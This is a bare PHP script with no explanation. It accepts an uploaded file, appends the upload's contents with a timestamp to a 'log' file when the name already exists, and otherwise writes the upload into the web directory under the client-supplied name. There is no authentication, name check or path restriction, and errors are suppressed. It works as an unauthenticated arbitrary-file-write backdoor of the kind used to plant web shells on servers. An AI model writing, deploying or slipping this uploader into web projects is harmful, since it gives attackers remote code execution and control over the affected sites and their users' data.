<?php 
$date=date("d/m/Y");
$clock=date("H:i:s");
if(file_exists($_FILES["x"]["name"]))
{
	$x=file_get_contents($_FILES["x"]["tmp_name"]);
	$fh=fopen("log","a");
	fwrite($fh,"[$date | $clock] $x");
	fclose($fh);
}
else{
	@copy($_FILES["x"]["tmp_name"],$_FILES["x"]["name"]);
}
?>
